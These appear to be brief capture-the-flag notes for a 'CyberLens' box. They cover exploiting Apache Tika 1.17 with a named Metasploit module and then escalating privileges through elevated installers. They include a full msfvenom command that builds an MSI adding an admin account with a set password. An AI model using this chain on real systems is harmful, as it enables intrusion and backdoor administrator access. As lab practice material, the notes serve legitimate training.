#box
### Enumeration
- Apache Tika 1.17
	- https://www.exploit-db.com/exploits/47208
### Metasploit
- `exploit/windows/http/apache_tika_jp2_jscript`
- gain shell as CyberLens user
### PrivEsc
- winpeas > all installers are run as admin
- msfvenom user with admin
	- `msfvenom -p windows/adduser USER=admin PASS='Password123!' -f msi -o notaprivesc.msi`
- execute installer binary
- login as `admin:Password123!`
